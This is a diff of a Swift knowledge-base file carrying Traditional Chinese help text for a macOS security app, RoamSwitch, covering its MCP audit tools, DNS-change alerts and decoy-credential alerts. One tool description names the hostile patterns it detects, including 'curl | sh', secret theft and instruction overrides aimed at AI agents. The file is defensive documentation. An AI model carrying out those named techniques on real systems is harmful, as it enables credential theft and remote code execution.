+                • 更新停止時:如果更新程式對正在使用的資料超過一週沒有檢查(每週只取得一次的兩個 CVE 對照表為兩週;檢查失敗也算檢查過),選單會顯示一行警告,寫明該資料的名稱和最後一次檢查的時間。在 `get_guard_status` 中,signedUpdates 為 off(原因 state_stale),該資料在 feedUpdates 中為 stale: true。對象是套件 CVE 對照表和 Web 規則、連結保護自動更新開啟(Pro)時的連結名單,以及主動掃描開啟時的主動掃描 CVE 對照表。重新啟動 RoamSwitch 會立即檢查。從未檢查過的資料不算已停止,視窗會顯示尚未更新。
                 """,
                 recommendation: "定期執行 Homebrew 掃描，在「相依性」分頁登錄開發中的專案，並儘快更新含有嚴重 CVE 的套件。"
             ),
@@ -835,7 +856,7 @@ extension RoamSwitchKnowledgeBase {
                 summary: "RoamSwitch.app 內建 MCP（Model Context Protocol）伺服器，讓 Claude 等 AI 助理可以查詢您 Mac 的安全狀態。沒有任何工具會變更設定、保護等級、連接埠或裝置。只有三個工具會寫入內容，而且只寫入各自的記錄檔。",
                 details: """
                 • 傳輸方式：僅限本機 stdio。執行檔位置：`/Applications/RoamSwitch.app/Contents/MacOS/RoamSwitchMCPServer`。
-                • 主要工具（共 35 個）：`get_security_report`（安全稽核）、`verify_security_findings`（重新確認稽核所指出的問題是否仍然存在，唯讀）、`get_exposed_ports`、`get_guard_status`、`audit_url_safety`、`audit_secrets`、`audit_mcp_configs`（檢查 MCP 用戶端設定檔中的危險項目（包括讀取他人撰寫文字的伺服器與可執行指令的伺服器同處一份設定，即間接提示注入的前提）；本機、唯讀；也可在「惡意軟體防護」→「🧩 稽核 MCP 設定（AI 整合）…」的專用視窗中執行）、`audit_agent_setup`（檢查提供給 AI 代理的指示檔、技能和 OpenClaw 設定中的危險內容，如不可見的 Unicode 字元、指示覆蓋、curl | sh、竊取機密的形態；也以同樣的規則檢查代理的記憶，並檢查已登記專案中的 `.vscode/tasks.json`（開啟資料夾時自動執行的工作）和 `.github/workflows`（帶機密執行 Pull Request 的程式碼、把不可信文字放進指令碼、未固定到提交的第三方 Action）；對 Claude Code 的設定（`~/.claude` 以及各已登記專案 `.claude` 資料夾中的 `settings.json` 和 `settings.local.json`），還會檢查不經確認就執行一切的權限模式、允許任意指令的過寬許可規則、掛鉤和被更改的 API 連線點，並指出標記為已確認之後變寬鬆的設定（刪除了禁止規則、增加了寬泛的許可規則或掛鉤、提高了權限模式、關閉了沙盒）；規則和指令的文字不會出現在結果中；本機、唯讀；也可在「惡意軟體防護」→「🤖 稽核 AI 代理的指示檔…」視窗中執行）、`audit_security_logs`、`get_quarantine_status`、`get_notification_history`、`get_canary_status`、`get_port_anomaly_incidents`、`get_ssh_guard_incidents`（SSH 暴力破解記錄與最近的 SSH 登入；唯讀）、`get_runtime_threat_status`、`get_incident_timeline`（圍堵事件時間軸）、`get_detection_coverage`（列出 RoamSwitch 能偵測與無法偵測的攻擊手法，唯讀）、`get_network_history`（網路歷史學習）、`run_package_cve_scan`、`run_package_cve_scan_languages`、`run_active_vuln_scan`（僅對 127.0.0.1 進行非破壞性探測）、`run_npm_audit_signatures`（唯一會與外部伺服器即 npm 登錄庫通訊的工具，僅限 Pro 且需主動啟用），以及 `get_app_help`（本知識庫）。
+                • 主要工具（共 35 個）：`get_security_report`（安全稽核）、`verify_security_findings`（重新確認稽核所指出的問題是否仍然存在，唯讀；以 `change` 區分是已修復還是原本就不適用）、`get_exposed_ports`、`get_guard_status`、`audit_url_safety`、`audit_secrets`、`audit_mcp_configs`（檢查 MCP 用戶端設定檔中的危險項目（包括讀取他人撰寫文字的伺服器與可執行指令的伺服器同處一份設定，即間接提示注入的前提）；本機、唯讀；也可在「惡意軟體防護」→「🧩 稽核 MCP 設定（AI 整合）…」的專用視窗中執行）、`audit_agent_setup`（檢查提供給 AI 代理的指示檔、技能和 OpenClaw 設定中的危險內容，如不可見的 Unicode 字元、指示覆蓋、curl | sh、竊取機密的形態；也以同樣的規則檢查代理的記憶，並檢查已登記專案中的 `.vscode/tasks.json`（開啟資料夾時自動執行的工作）和 `.github/workflows`（帶機密執行 Pull Request 的程式碼、把不可信文字放進指令碼、未固定到提交的第三方 Action）；對 Claude Code 的設定（`~/.claude` 以及各已登記專案 `.claude` 資料夾中的 `settings.json` 和 `settings.local.json`），還會檢查不經確認就執行一切的權限模式、允許任意指令的過寬許可規則、掛鉤和被更改的 API 連線點，並指出標記為已確認之後變寬鬆的設定（刪除了禁止規則、增加了寬泛的許可規則或掛鉤、提高了權限模式、關閉了沙盒）；規則和指令的文字不會出現在結果中；本機、唯讀；也可在「惡意軟體防護」→「🤖 稽核 AI 代理的指示檔…」視窗中執行）、`audit_security_logs`、`get_quarantine_status`、`get_notification_history`、`get_canary_status`、`get_port_anomaly_incidents`、`get_ssh_guard_incidents`（SSH 暴力破解記錄與最近的 SSH 登入；唯讀）、`get_runtime_threat_status`、`get_incident_timeline`（圍堵事件時間軸）、`get_detection_coverage`（列出 RoamSwitch 能偵測與無法偵測的攻擊手法，唯讀）、`get_network_history`（網路歷史學習）、`run_package_cve_scan`、`run_package_cve_scan_languages`、`run_active_vuln_scan`（僅對 127.0.0.1 進行非破壞性探測）、`run_npm_audit_signatures`（唯一會與外部伺服器即 npm 登錄庫通訊的工具，僅限 Pro 且需主動啟用），以及 `get_app_help`（本知識庫）。
                 • 程序執行記錄（Pro，唯讀）：`search_exec_events`（搜尋啟動事件）和 `get_process_tree`（某程序的祖先與後代）。
                 • 資源：`roamswitch://docs/features`、`roamswitch://docs/alerts-and-messages`、`roamswitch://docs/settings-guide`、`roamswitch://docs/troubleshooting`。
                 • 語言：回答依應用程式的語言設定而定。`get_app_help` 接受 `language` 參數（ja / en / zh-Hans / zh-Hant / ko / de / fr / es / it / pt-PT）。
@@ -1219,6 +1240,7 @@ extension RoamSwitchKnowledgeBase {
                 summary: "所連網路發放的 DNS 伺服器、路由器或代理伺服器自動設定（PAC）與同一網路之前的狀態不同。可能存在偽造的 DHCP 伺服器或 WPAD 中間人攻擊。",
                 details: """
                 • 通知內容：網路名稱，以及以前沒見過的 DNS 伺服器、路由器或 PAC 主機，或 WPAD 被開啟。
+                • 服務的已儲存設定中新增了 DNS 伺服器（會顯示服務名稱）：它由你、管理員或某個程式透過 `networksetup -setdnsservers` 或「網路」面板寫入，無法判斷是哪一個。如果不是你做的，請在系統設定的「網路」中把 DNS 伺服器改回去。
                 • 無害原因的例子：更換路由器、更換電信業者或修改設定；公司或學校網路的管理員變更了設定。
                 • 自動處理：僅通知。不會修改設定，也不會封鎖通訊。相同內容的通知只發送一次。
                 """,
@@ -1292,13 +1314,13 @@ extension RoamSwitchKnowledgeBase {
                 summary: "提示 RoamSwitch 放置的偽造憑證檔案(例如 ~/.aws/credentials)被讀取。",
                 details: """
                 • 通知顯示的資訊:被讀取的偽造檔案路徑、存取它的程式(路徑與 PID)、其父行程,以及指令(金鑰等機密已被遮蓋)。
-                • 無法確定存取者時:通知會如實說明,並顯示已檢查的內容(開啟該檔案的行程、行程執行記錄)。讀取檔案的行程往往已經結束;若已開啟行程執行記錄,會列出同一時刻啟動的指令(它們不一定讀取了該檔案)。
+                • 無法確定存取者時:通知會如實說明,並顯示已檢查的內容(開啟該檔案的行程、行程執行記錄)。讀取檔案的行程往往已經結束;若已開啟行程執行記錄,會列出同一時刻啟動的指令(它們不一定讀取了該檔案)。若已開啟「開啟檔案的行程記錄」（在「行程執行記錄」視窗中），會直接列出讀取檔案的行程本身（PID、父行程、指令、簽章），不再列出同一時刻啟動的指令這類推測；若已關閉、因負載暫停或尚未開始，通知中會寫明。
                 • 自動防禦:僅通知與記錄(會追加放置相關的偽造檔案;不會切斷網路)。
                 """,
                 recommendation: """
                 1. 查看存取者的路徑與指令,確認是不是您自己執行的。
                 2. 若沒有印象,請檢查該程式的位置與簽章,停止它,並撤銷、重新核發相關憑證(AWS 金鑰、SSH 金鑰、Docker 驗證等)。
-                3. 若不知道存取者是誰,請開啟行程執行記錄;此後通知中會列出同一時刻啟動的指令(feat_exec_recorder)。
+                3. 若不知道存取者是誰,請開啟行程執行記錄;此後通知中會列出同一時刻啟動的指令(feat_exec_recorder)。想直接知道是哪個行程讀取的，請在同一視窗中同時開啟「開啟檔案的行程記錄」。
                 """
             ),
             LocalizedEntry(
@@ -1367,7 +1389,7 @@ extension RoamSwitchKnowledgeBase {
                 • 之後版本新增的防護，會為既有的 Pro 使用者套用各自的一次性預設值。您關閉的防護，即使重新啟用授權也會維持關閉。移除授權時，Pro 專屬防護會被關閉；原本開啟的防護會在下次啟用 Pro 時依預設值重新開啟。
                 • 選單標記:✅ 表示設定已開啟且在運作。🟡 表示只有一部分在運作(輔助程式未連線、系統延伸功能等待批准、有無法讀取的檔案)。⚠️ 表示設定已開啟但沒有運作(Pro 未啟用、輔助程式未連線、無法讀取輸入、沒有可監視的對象、誘餌一個都沒放成)。原因顯示在項目尾端的方括號與滑鼠停留的說明中。同樣的狀態就是 `get_guard_status` 中的 liveState 與 liveStateReason。
                 • 啟動時無法驗證授權:如果儲存的授權無法通過驗證(Pro 已過期、為另一台 Mac 簽發、簽章無效),啟動後不久會用一則通知點名那些設定仍開啟但已停止的防護。首次啟用 Pro 之後,也會用一則通知列出已開啟的防護、需要自行開啟的防護,以及仍無法運作的原因(輔助程式批准、系統延伸功能批准、完整磁碟取用權限、登錄監視資料夾)。
-                • 自我監控(當機後自動重新啟動):預設關閉。在選單的「自我監控…」中同意後,會把應用程式內的小型監控程式註冊為登入項目(可能需要在系統設定中批准)。狀態顯示在選單與 `get_detection_coverage`(T1562.001 的 liveState 與 liveStateReason)中。關閉也在同一項目中進行,解除安裝時會一併移除。 核准後，監看程式會從下次登入起開始運作。
+                • 自我監控(當機後自動重新啟動):預設關閉。在選單的「自我監控…」中同意後,會把應用程式內的小型監控程式註冊為登入項目(可能需要在系統設定中批准)。狀態顯示在選單與 `get_detection_coverage`(T1685 的 liveState 與 liveStateReason)中。關閉也在同一項目中進行,解除安裝時會一併移除。 核准後，監看程式會從下次登入起開始運作。
                 • 當 macOS 通知未被允許,或通知樣式為「無」時,警告不會顯示在螢幕上(仍保留在通知記錄中)。選單最上方會出現「通知未被允許…」一行,診斷與通知記錄視窗裡會出現橫幅。首次使用指引中也有一頁,說明通知以及之後需要的權限(完整磁碟取用權限、系統延伸功能、輔助使用、定位服務)。
                 """,
                 recommendation: "啟用 Pro 後，請檢查選單中的 ✅ 標記。不符合您使用情境的防護（例如未使用 Docker）可維持關閉，並開啟您需要的功能（例如經常使用公共 Wi-Fi 就開啟 VPN）。"
